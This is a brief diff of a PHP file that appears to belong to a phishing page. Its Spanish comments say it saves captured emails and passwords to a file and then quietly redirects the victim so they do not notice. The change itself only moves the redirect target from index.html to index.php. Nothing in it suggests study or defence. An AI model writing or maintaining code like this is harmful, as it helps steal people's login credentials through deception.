@@ -29,7 +29,7 @@
           //los emails y passwords
           fwrite($archivo,$contenido);
           //se realizo y sin darnos cuenta redigige el php a link de coloquemos con el header...
-          header("location: index.html");
+          header("location: index.php");
         ?>
 
 </head>
